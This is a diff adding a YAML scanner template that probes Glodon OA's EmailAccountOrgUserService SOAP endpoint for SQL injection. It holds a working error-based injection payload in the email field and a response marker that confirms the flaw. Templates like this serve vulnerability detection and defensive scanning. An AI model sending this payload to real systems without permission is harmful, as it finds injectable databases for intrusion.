@@ -1,0 +1,22 @@
+name: 广联达OA-EmailAccountOrgUserService-SQL
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /Mail/Services/EmailAccountOrgUserService.asmx
+    headers:
+      Content-Type: text/xml
+      SOAPAction: "http://tempuri.org/GetUserInfosByEmail"
+    body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUserInfosByEmail xmlns="http://tempuri.org/">
+        <email>') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('ShLa'='ShLa</email>
+        </GetUserInfosByEmail>
+        </soap:Body>
+        </soap:Envelope>
+    expression:
+      body_all: ["qkkkq1qjpzq"]
